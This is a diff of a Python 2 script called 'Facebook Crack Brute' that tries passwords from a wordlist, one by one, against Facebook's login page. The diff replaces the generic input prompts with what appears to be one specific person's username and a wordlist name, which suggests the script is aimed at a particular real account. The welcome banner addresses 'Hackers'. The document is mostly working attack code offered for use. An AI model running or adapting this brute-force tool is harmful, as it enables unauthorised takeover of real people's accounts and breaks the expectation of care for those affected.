@@ -16,10 +16,10 @@ import random
 
 
 
-email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+email = str(raw_input("keithrine.memeow : "))
 
 
-passwordlist = str(raw_input("Enter the wordlist name and path : "))
+passwordlist = str(raw_input("rocyou.txt : "))
 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
@@ -41,8 +41,8 @@ def main():
 	search()
 	print("Password does not exist in the wordlist")
 
-	
-	
+
+
 def brute(password):
 	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
 	sys.stdout.flush()
@@ -58,7 +58,7 @@ def brute(password):
 			raw_input("ANY KEY to Exit....")
 			sys.exit(1)
 
-			
+
 def search():
 	global password
 	passwords = open(passwordlist,"r")
@@ -66,14 +66,14 @@ def search():
 		password = password.replace("\n","")
 		brute(password)
 
-		
+
 #welcome Hackers
 def welcome():
 	wel = """
         +=========================================+
         |..........   Facebook Crack Brute   ...........|
         +-----------------------------------------+
-        |            #Author: Technical Dipesh          | 
+        |            #Author: Technical Dipesh          |
         |	       Version 1.0                      |
  	|   https://www.youtube.com/channel/UCXuKDM3J_GkCxmdki8Hxh4w      |
         +=========================================+
@@ -87,7 +87,7 @@ def welcome():
 	print( " [*] Loaded :" , len(total), "passwords" )
 	print( " [*] Cracking, please wait ...\n\n" )
 
-	
+
 if __name__ == '__main__':
 	main()
 
